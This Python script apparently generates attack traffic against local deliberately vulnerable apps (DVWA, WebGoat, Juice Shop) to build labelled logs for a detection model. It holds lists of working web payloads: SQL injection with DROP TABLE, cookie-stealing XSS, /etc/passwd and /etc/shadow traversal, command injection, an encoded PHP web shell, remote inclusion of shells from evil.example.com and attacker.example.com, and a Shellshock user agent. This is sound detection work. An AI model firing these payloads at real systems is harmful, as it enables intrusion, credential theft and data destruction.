"""
scripts/traffic/attack_runner.py

Generates realistic attack traffic against the local vulnerable app stack.
Runs alongside benign_crawler.py — both should be active simultaneously.

CRITICAL DESIGN DECISIONS:
- UA must be rotated across all attack types. If every attack uses the same UA,
  the model learns UA as the malicious signal instead of the actual payload.
  This is exactly what happened with the original single-UA version.
- Attack types must be diverse: all 11 types covered.
  A model trained on one attack type cannot generalize to others.
- Run time: 90-120 minutes alongside benign_crawler.py.
  Target: 1500+ raw malicious log lines before parsing.

Usage:
    python scripts/traffic/attack_runner.py
"""

import requests
import time
import random

BASE = "http://localhost"

# ── SQL Injection ─────────────────────────────────────────────────────────────
SQLI_ATTACKS = [
    "/dvwa/vulnerabilities/sqli/?id=1' OR '1'='1&Submit=Submit",
    "/dvwa/vulnerabilities/sqli/?id=1 UNION SELECT user,password FROM users--",
    "/dvwa/vulnerabilities/sqli/?id=1; DROP TABLE users--",
    "/dvwa/vulnerabilities/sqli/?id=' AND SLEEP(5)--",
    "/dvwa/vulnerabilities/sqli/?id=1' AND 1=2 UNION SELECT NULL,@@version--",
    "/dvwa/vulnerabilities/sqli/?id=1' AND '1'='1",
    "/dvwa/vulnerabilities/sqli/?id=admin'--",
    "/dvwa/vulnerabilities/sqli/?id=1 OR 1=1--",
    "/webgoat/SqlInjection/attack?username=admin'--",
    "/webgoat/SqlInjection/attack?username=' OR 1=1--",
    "/webgoat/SqlInjection/attack?username=admin' AND '1'='1",
    "/webgoat/SqlInjection/attack?username=' UNION SELECT username,password FROM users--",
    "/webgoat/SqlInjection/attack?username='; DROP TABLE employees--",
]

# ── Cross-Site Scripting (XSS) ────────────────────────────────────────────────
XSS_ATTACKS = [
    "/dvwa/vulnerabilities/xss_r/?name=<script>alert(1)</script>",
    "/dvwa/vulnerabilities/xss_r/?name=<img src=x onerror=alert(1)>",
    "/dvwa/vulnerabilities/xss_r/?name=<svg onload=alert(document.cookie)>",
    "/dvwa/vulnerabilities/xss_r/?name=javascript:alert(1)",
    "/dvwa/vulnerabilities/xss_r/?name=<iframe src=javascript:alert(1)>",
    "/dvwa/vulnerabilities/xss_r/?name=<body onload=alert(1)>",
    "/dvwa/vulnerabilities/xss_r/?name='\"><script>alert(1)</script>",
    "/juice/rest/products/search?q=<script>alert(1)</script>",
    "/juice/rest/products/search?q=<img src=x onerror=alert(1)>",
    "/juice/rest/products/search?q=<svg/onload=alert(1)>",
]

# ── Path Traversal ────────────────────────────────────────────────────────────
PATH_TRAVERSAL_ATTACKS = [
    "/dvwa/vulnerabilities/fi/?page=../../../etc/passwd",
    "/dvwa/vulnerabilities/fi/?page=....//....//etc/passwd",
    "/dvwa/vulnerabilities/fi/?page=..%2f..%2f..%2fetc%2fpasswd",
    "/dvwa/vulnerabilities/fi/?page=%2e%2e%2f%2e%2e%2fetc/passwd",
    "/dvwa/vulnerabilities/fi/?page=../../../etc/shadow",
    "/dvwa/vulnerabilities/fi/?page=..%252f..%252f..%252fetc%252fpasswd",
    "/webgoat/PathTraversal/attack?filename=../../../etc/passwd",
    "/webgoat/PathTraversal/attack?filename=....//....//etc/passwd",
]

# ── Command Injection ─────────────────────────────────────────────────────────
CMD_INJECTION_ATTACKS = [
    "/dvwa/vulnerabilities/exec/?ip=127.0.0.1;cat /etc/passwd&Submit=Submit",
    "/dvwa/vulnerabilities/exec/?ip=127.0.0.1|whoami&Submit=Submit",
    "/dvwa/vulnerabilities/exec/?ip=127.0.0.1%3Bls%20-la&Submit=Submit",
    "/dvwa/vulnerabilities/exec/?ip=;id&Submit=Submit",
    "/dvwa/vulnerabilities/exec/?ip=127.0.0.1&&cat /etc/passwd&Submit=Submit",
    "/dvwa/vulnerabilities/exec/?ip=`id`&Submit=Submit",
    "/dvwa/vulnerabilities/exec/?ip=$(whoami)&Submit=Submit",
]

# ── NoSQL Injection ───────────────────────────────────────────────────────────
# MongoDB-style operators injected into query params.
# Target: any app accepting JSON-like or key=value params.
NOSQL_ATTACKS = [
    "/dvwa/vulnerabilities/sqli/?id[$ne]=1",
    "/dvwa/vulnerabilities/sqli/?id[$gt]=0",
    "/webgoat/login?username[$ne]=admin&password[$ne]=x",
    "/juice/rest/user/login?email[$regex]=.*&password[$ne]=x",
    "/dvwa/vulnerabilities/sqli/?id[$where]=sleep(1000)",
    "/juice/rest/products/search?q[$regex]=.*",
]

# ── LDAP Injection ────────────────────────────────────────────────────────────
# Classic LDAP filter bypass payloads.
LDAP_ATTACKS = [
    "/dvwa/vulnerabilities/sqli/?id=*)(uid=*))(|(uid=*",
    "/webgoat/login?username=*)(|(password=*)&password=anything",
    "/dvwa/vulnerabilities/sqli/?id=admin)(%00",
    "/juice/rest/user/login?email=*)(uid=*))(|(uid=*&password=x",
    "/dvwa/vulnerabilities/sqli/?id=)(|(objectclass=*)",
]

# ── Local File Inclusion (LFI) ────────────────────────────────────────────────
# PHP stream wrappers and filter chains — distinct from path traversal.
# Path traversal = directory walking. LFI = PHP execution/reading via wrappers.
LFI_ATTACKS = [
    "/dvwa/vulnerabilities/fi/?page=php://filter/convert.base64-encode/resource=index.php",
    "/dvwa/vulnerabilities/fi/?page=php://filter/read=string.rot13/resource=config.php",
    "/dvwa/vulnerabilities/fi/?page=php://input",
    "/dvwa/vulnerabilities/fi/?page=data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7Pz4=",
    "/dvwa/vulnerabilities/fi/?page=php://filter/convert.base64-encode/resource=/etc/passwd",
    "/webgoat/PathTraversal/attack?filename=php://filter/convert.base64-encode/resource=../config",
]

# ── Remote File Inclusion (RFI) ───────────────────────────────────────────────
# External URL inclusion attempts — requires allow_url_include=On in PHP.
RFI_ATTACKS = [
    "/dvwa/vulnerabilities/fi/?page=http://evil.example.com/shell.php",
    "/dvwa/vulnerabilities/fi/?page=http://192.168.1.100/malicious.txt",
    "/dvwa/vulnerabilities/fi/?page=https://attacker.example.com/webshell.php?",
    "/dvwa/vulnerabilities/fi/?page=ftp://evil.example.com/shell.php",
]

# ── PHP Injection ─────────────────────────────────────────────────────────────
# PHP code execution patterns in paths and params.
PHP_ATTACKS = [
    "/dvwa/vulnerabilities/exec/?ip=127.0.0.1;echo%20shell_exec('id')",
    "/webgoat/login?username=admin&cmd=system('id')",
    "/dvwa/vulnerabilities/fi/?page=expect://id",
    "/juice/rest/products/search?q=eval(base64_decode('c3lzdGVtKCdpZCcp'))",
    "/dvwa/vulnerabilities/sqli/?id=1;passthru('whoami')",
    "/dvwa/vulnerabilities/exec/?ip=127.0.0.1%3Bgzdecode(base64_decode('...'))",
]

# ── Scanner / Reconnaissance Probes ──────────────────────────────────────────
# Common scanner fingerprinting paths — no app-specific endpoint needed.
# These hit the Nginx proxy directly; 404s are expected and that's fine.
# The label_logs.py labeler catches these on path pattern, not status code.
SCANNER_ATTACKS = [
    "/.env",
    "/.git/config",
    "/.git/HEAD",
    "/wp-login.php",
    "/wp-admin/",
    "/phpmyadmin/",
    "/phpmyadmin/index.php",
    "/xmlrpc.php",
    "/.htaccess",
    "/admin/",
    "/backup.zip",
    "/config.php~",
    "/config.bak",
    "/.DS_Store",
    "/server-status",
    "/actuator/env",
    "/actuator/health",
    "/.well-known/security.txt",
    "/console/",
    "/manager/html",
]

ALL_ATTACKS = (
    SQLI_ATTACKS
    + XSS_ATTACKS
    + PATH_TRAVERSAL_ATTACKS
    + CMD_INJECTION_ATTACKS
    + NOSQL_ATTACKS
    + LDAP_ATTACKS
    + LFI_ATTACKS
    + RFI_ATTACKS
    + PHP_ATTACKS
    + SCANNER_ATTACKS
)

# ── User Agent Rotation ───────────────────────────────────────────────────────
# CRITICAL: rotate UAs across all attack types.
# Original code used only python-requests/2.32.5 for every attack.
# The model learned UA as the malicious signal, not the payload.
# Rotation forces the model to learn from the payload/path, not the UA.
ATTACK_USER_AGENTS = [
    "sqlmap/1.7",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
    "Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0",
    "curl/8.0.1",
    "python-requests/2.31.0",
    "python-requests/2.32.5",
    "Nikto/2.1.6",
    "Go-http-client/1.1",
    "WPScan v3.8.22",
    "() { :;}; /bin/bash -c 'id'",   # Shellshock in UA — labeler scopes this to request only
    "Mozilla/5.0 (compatible; attacker/1.0)",
]


def run():
    print(f"[attack_runner] Starting. {len(ALL_ATTACKS)} attack patterns loaded.")
    print(f"[attack_runner] Attack type breakdown:")
    print(f"  SQLi          : {len(SQLI_ATTACKS)}")
    print(f"  XSS           : {len(XSS_ATTACKS)}")
    print(f"  Path Traversal: {len(PATH_TRAVERSAL_ATTACKS)}")
    print(f"  CMDi          : {len(CMD_INJECTION_ATTACKS)}")
    print(f"  NoSQL         : {len(NOSQL_ATTACKS)}")
    print(f"  LDAP          : {len(LDAP_ATTACKS)}")
    print(f"  LFI           : {len(LFI_ATTACKS)}")
    print(f"  RFI           : {len(RFI_ATTACKS)}")
    print(f"  PHP           : {len(PHP_ATTACKS)}")
    print(f"  Scanner       : {len(SCANNER_ATTACKS)}")
    print(f"[attack_runner] Press Ctrl+C to stop.\n")

    sent = 0
    while True:
        attack = random.choice(ALL_ATTACKS)
        ua = random.choice(ATTACK_USER_AGENTS)
        try:
            requests.get(
                BASE + attack,
                headers={"User-Agent": ua},
                timeout=5
            )
            sent += 1
            if sent % 50 == 0:
                print(f"[attack_runner] {sent} attacks sent so far...")
        except Exception:
            pass
        time.sleep(random.uniform(0.5, 2))


if __name__ == "__main__":
    run()